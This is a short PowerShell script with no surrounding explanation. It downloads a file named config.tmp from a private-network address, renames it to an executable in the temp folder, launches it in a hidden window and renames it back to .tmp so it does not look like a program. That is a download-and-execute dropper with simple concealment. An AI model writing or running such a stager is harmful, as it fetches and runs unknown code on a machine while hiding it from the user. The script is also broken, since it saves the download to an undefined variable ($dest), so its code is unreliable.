$url  = "http://172.16.41.1:8000/config.tmp"
$tmp = "$env:TEMP\2fd19d11-d4b7-46d1-94db-7edd16980d15.tmp"
$exe  = "$env:TEMP\2fd19d11-d4b7-46d1-94db-7edd16980d15.exe"

Invoke-WebRequest -Uri $url -OutFile $dest -UseBasicParsing

Move-Item -Path $tmp -Destination $exe -Force
Start-Process $exe -WindowStyle Hidden
Move-Item -Path $exe -Destination $tmp -Force